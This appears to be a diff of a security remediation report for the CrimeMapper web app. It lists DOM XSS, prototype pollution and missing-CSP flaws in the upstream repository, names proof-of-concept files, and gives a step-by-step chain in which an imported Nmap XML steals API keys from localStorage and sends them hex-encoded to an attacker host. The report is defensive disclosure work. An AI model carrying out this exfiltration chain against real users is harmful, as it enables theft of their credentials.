@@ -1,18 +1,94 @@
 # CrimeMapper Security Remediation Report
 
 **Date:** 2026-01-17
-**Original Version:** `/home/carroll/Desktop/ReCard/CrimeMapper/crimemapper.html`
-**Fixed Version:** `/home/carroll/Desktop/ReCard/CrimeMapper_FIXED/crimemapper.html`
+**Affected:** [mr-r3b00t/crime-mapper](https://github.com/mr-r3b00t/crime-mapper) (upstream)
+**Fixed In:** This fork ([Splinters-io/crime-mapper](https://github.com/Splinters-io/crime-mapper))
 
 ---
 
 ## Executive Summary
 
-This document details the security vulnerabilities discovered in CrimeMapper and the remediation steps applied. The application was vulnerable to multiple attack vectors including Cross-Site Scripting (XSS), Prototype Pollution, and data exfiltration via CSRF-like attacks.
+This document details critical security vulnerabilities discovered in the CrimeMapper application. The **upstream version remains vulnerable** to multiple attack vectors that allow an attacker to steal API keys (Shodan, IPInfo, GreyNoise, URLScan, SecurityTrails) stored in the user's browser.
+
+**Attack Chain:** Attacker sends victim a malicious Nmap XML or JSON file → Victim imports it → XSS executes → API keys exfiltrated to attacker-controlled server.
 
 ---
 
-## Vulnerabilities Fixed
+## Vulnerabilities in Upstream (Unfixed)
+
+The following vulnerabilities exist in the original [mr-r3b00t/crime-mapper](https://github.com/mr-r3b00t/crime-mapper) repository:
+
+| ID | Vulnerability | Severity | CWE | Demonstrable PoC |
+|----|---------------|----------|-----|------------------|
+| 1 | DOM XSS via vis-network Tooltips | **Critical** | CWE-79 | `PoC/malicious_nmap_exfil.xml` |
+| 2 | DOM XSS via Inline onclick Handlers | **Critical** | CWE-79 | `PoC/05_context_menu_quote_breakout.json` |
+| 3 | DOM XSS via innerHTML | **High** | CWE-79 | `PoC/01_contact_email_xss.json` |
+| 4 | Prototype Pollution via Object.assign | **High** | CWE-1321 | `PoC/11_prototype_pollution.json` |
+| 5 | Missing Content Security Policy | **Critical** | CWE-1021 | All exfil PoCs work due to no CSP |
+| 6 | No Import Validation/Warning | **Medium** | CWE-352 | Social engineering + any PoC |
+
+### Proof of Concept Files
+
+| File | Attack Vector | Impact |
+|------|---------------|--------|
+| `malicious_nmap_scan.xml` | Nmap XML import → hostname field | `alert('XSS!')` popup |
+| `malicious_nmap_exfil.xml` | Nmap XML import → hostname field | **Exfiltrates all API keys as hex** |
+| `01_contact_email_xss.json` | JSON import → contact email | localStorage exfil |
+| `02_ip_notes_xss.json` | JSON import → IP notes | Shodan API key exfil |
+| `03_organization_xss.json` | JSON import → org name | Multi-key exfil |
+| `04_domain_chunked_exfil.json` | JSON import → domain | Chunked exfil (large data) |
+| `05_context_menu_quote_breakout.json` | Right-click context menu | JS string breakout |
+| `06_favicon_hash_xss.json` | JSON import → favicon hash | Cookie exfil |
+| `12_persistent_xss_localstorage.json` | JSON import → contact | **Persistent beacon every 30s** |
+
+### Exploitation Steps (Upstream)
+
+```
+1. Attacker generates malicious Nmap XML:      PoC/malicious_nmap_exfil.xml
+
+2. Attacker sends to victim (email, Slack, shared drive, etc.)
+
+3. Victim opens CrimeMapper and clicks "Import Nmap XML"
+
+4. Victim selects the malicious file
+
+5. Victim hovers over node "10.0.0.99"
+
+6. XSS executes silently:
+   - Reads localStorage (contains API keys)
+   - Formats as: shodan:KEY,ipinfo:KEY,greynoise:KEY,...
+   - Hex encodes the data
+   - Sends to: https://attacker.oast.fun?yoink=<hex>
+
+7. Attacker decodes hex and has victim's API keys
+```
+
+### Decode Exfiltrated Data
+
+```bash
+# Hex decode
+echo "73686f64616e3a414243313233" | xxd -r -p
+# Output: shodan:ABC123
+```
+
+---
+
+## Remediation Applied (This Fork)
+
+This fork contains fixes for all identified vulnerabilities:
+
+| Vulnerability | Fix Applied |
+|---------------|-------------|
+| DOM XSS (tooltips) | `Security.encodeHTML()` on all user data |
+| DOM XSS (onclick) | Event delegation pattern, no inline handlers |
+| DOM XSS (innerHTML) | Replaced with `textContent` / DOM methods |
+| Prototype Pollution | `FORBIDDEN_KEYS` filter on object merges |
+| Missing CSP | Added strict `connect-src` whitelist |
+| No Import Warning | User confirmation dialog before import |
+
+---
+
+## Detailed Vulnerability Analysis
 
 ### 1. DOM-Based XSS via vis-network Tooltips
 
